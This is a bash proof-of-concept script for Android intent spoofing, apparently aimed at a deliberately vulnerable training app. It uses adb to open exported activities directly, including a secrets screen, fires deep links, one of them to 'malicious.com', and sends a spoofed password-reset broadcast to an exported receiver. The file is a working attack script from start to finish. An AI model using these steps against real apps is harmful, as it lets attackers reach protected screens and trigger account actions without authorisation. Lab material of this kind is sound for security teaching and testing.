#!/bin/bash
# PoC for Android Intent Spoofing - Exported Components Access
# Usage: ./exploit.sh
# Make sure device is connected via ADB

echo "[+] Starting Android Intent Spoofing PoC..."

# Start logcat in background to monitor results
adb logcat -c
adb logcat | grep -E "(vulnerapp|SpoofableReceiver|dlh)" &
LOGCAT_PID=$!

sleep 2

echo "[+] Exploiting exported activities..."

# Launch MainActivity
echo "[*] Launching MainActivity..."
adb shell am start -n com.dlh.vulnerapp/.MainActivity

sleep 1

# Launch SecretsActivity directly
echo "[*] Accessing SecretsActivity..."
adb shell am start -n com.dlh.vulnerapp/.SecretsActivity

sleep 1

# Launch WebViewActivity via deep link
echo "[*] Triggering WebViewActivity via deep link..."
adb shell am start -a android.intent.action.VIEW -d "dlh://webview/test"

sleep 1

# Launch SQLInjectionActivity
echo "[*] Accessing SQLInjectionActivity..."
adb shell am start -n com.dlh.vulnerapp/.SQLInjectionActivity

sleep 1

# Launch InsecureFileActivity
echo "[*] Accessing InsecureFileActivity..."
adb shell am start -n com.dlh.vulnerapp/.InsecureFileActivity

sleep 1

# Launch CryptoActivity
echo "[*] Accessing CryptoActivity..."
adb shell am start -n com.dlh.vulnerapp/.CryptoActivity

sleep 1

# Launch GraphQLInjectionActivity
echo "[*] Accessing GraphQLInjectionActivity..."
adb shell am start -n com.dlh.vulnerapp/.GraphQLInjectionActivity

sleep 1

# Launch UnprotectedExportedActivity via deep link
echo "[*] Triggering UnprotectedExportedActivity via deep link..."
adb shell am start -a android.intent.action.VIEW -d "vulnerapp://malicious.com/exploit"

sleep 1

# Send broadcast to SpoofableReceiver for password reset
echo "[*] Sending spoofed password reset broadcast..."
adb shell am broadcast -a com.dlh.vulnerapp.ACTION_RESET_PASSWORD

sleep 3

# Kill logcat
kill $LOGCAT_PID 2>/dev/null

echo "[+] PoC completed. Check device for opened activities and logcat output."
